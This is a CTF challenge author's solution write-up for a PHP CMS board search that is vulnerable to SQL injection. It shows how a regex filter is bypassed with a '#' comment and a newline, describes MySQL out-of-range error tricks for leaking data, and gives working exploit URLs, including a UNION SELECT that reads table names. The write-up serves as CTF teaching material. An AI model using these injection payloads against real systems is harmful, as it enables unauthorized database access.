## Idea

1. SQL Injection
2. Mysql trick



## Solution

- SQL Injection

  classes/Board.class.php line 24~42 

  ```php
  function action_search(){
      $column = Context::get('col');
      $search = Context::get('search');
      $type = strtolower(Context::get('type'));
      $operator = 'or';

      if($type === '1'){
          $operator = 'or';
      }
      else if($type === '2'){
          $operator = 'and';
      }
      if(preg_match('/[\<\>\'\"\\\'\\\"\%\=\(\)\/\^\*\-`;,.@0-9\s!\?\[\]\+_&$]/is', $column)){
          $column = 'title';
      }
      $query = get_search_query($column, $search, $operator);
      $result = DB::fetch_multi_row('board', '', '', '0, 10','date desc', $query);
      include(CMS_SKIN_PATH . 'board.php');
  }
  ```

  $column variable filtered by using regex but you can use '#' comment

   if your input is 'title#',  get_search_query function will return like this

  ```mysql
  SELECT * FROM table WHERE LOWER(title#) like '%blablabalbal%';
  ```

  and if you enter return value in search parameter, query work like this:

  ```mysql
  SELECT * FROM table WHERE LOWER(title#) like '%{return value}
  blablabalbal%';
  ```

  okay, we got the way to exploit!

  ​

- Mysql trick

  I'm trying to find trick of mysql and I found an interesting bug

  ```mysql
  select * from user where (id=1)-~1
  ```

  Result :

  ```
  ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((`sqli`.`user`.`id` = 1) - <cache>(~(1)))
  ```

  this works like exp function bug XDD

  ```mysql
  select * from user where id='a' or  exp(~id);
  ```

  ```
  ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~(`sqli`.`user`.`id`))'
  ```

  I intended the player to use this trick but they did not use this :(

  I made a mistake to set  the mysql account as root :( Sorry..

  ​

  ** Intended solution **

  ```
  table name leak : http://url/index.php?act=board&mid=search&col=title%23&type=1&search=%0a)^(id=1)-~1%23
  ```

  ** Unintended solution **

  ```
  http://url/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%3C0%20union%20select%201,(select%20table_name%20from%20mysql.innodb_table_stats%20limit%202,1),3,4,5%23
  ```



## Write up

https://ctftime.org/writeup/8619

http://www.zer0xlab.com/Web_SimpleCMS_CodeGateQ/
